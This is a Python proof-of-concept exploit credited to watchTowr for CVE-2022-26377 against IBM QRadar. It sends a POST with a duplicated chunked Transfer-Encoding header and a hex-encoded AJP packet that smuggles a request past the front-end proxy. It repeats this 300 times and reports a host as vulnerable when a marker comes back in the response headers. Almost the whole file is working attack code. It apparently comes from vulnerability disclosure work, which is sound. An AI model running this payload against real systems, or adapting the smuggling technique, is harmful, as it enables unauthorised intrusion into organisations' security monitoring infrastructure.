import requests
import re
import base64
import argparse
import socket, sys, ssl, time
import binascii
import time

banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            
	  
        watchtowr-vs-ibm_qradar_2024-04-12.py
          - Sonny, watchTowr (sonny@watchTowr.com)
        CVEs: [CVE-2022-26377]  """

helptext =  """
            Example Usage:
          - python watchtowr-vs-ibm_qradar_2024-04-12 --url http://localhost

			 """
proxies = {
   'http': 'http://127.0.0.1:8081',
   'https': 'http://127.0.0.1:8081',
}


parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("--url", help="target url in the format https://localhost", default=False, action="store", required=True)
try:
    args = parser.parse_args()
except:
    print(banner)
    print(helptext)
    raise

print(banner)
requests.urllib3.disable_warnings()
print(f"[*] Target Server: {args.url} ")

headers = {
  "Content-Type": "application/x-www-form-urlencoded",
  "Transfer-Encoding": "chunked, chunked"
}
payload_hex = "0008485454502f312e3100000b2f636f6e736f6c652f78780000093132372e302e302e310000026c6f0000076c6f63616c7874000050000003000154000020424242424242424242424242424242424242424242424242424242424242424200000a5741544348544f5752300000013000a00b000d7761746368746f77722e636f6d00030062626262620005016262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262653d00ff00"
data = b"204\r\n" + binascii.unhexlify(payload_hex) + b"\r\n0\r\n\r\n"

for i in range(300):
    
    green_color_code = '\033[92m'
    vuln_text = "[*] Host is vulnerable, poison consumed"
    reset_color_code = '\033[0m'
    # Your sequence here
    print(f"[*] Sending Poison ")
    
    try:
      response = requests.post(f"{args.url}/console/watchTowr", data=data, timeout=5, verify=False, headers=headers)
    except:
        1+1
    if "watchtowr" in str(response.headers):
        print(green_color_code + vuln_text + reset_color_code)
    time.sleep(1)
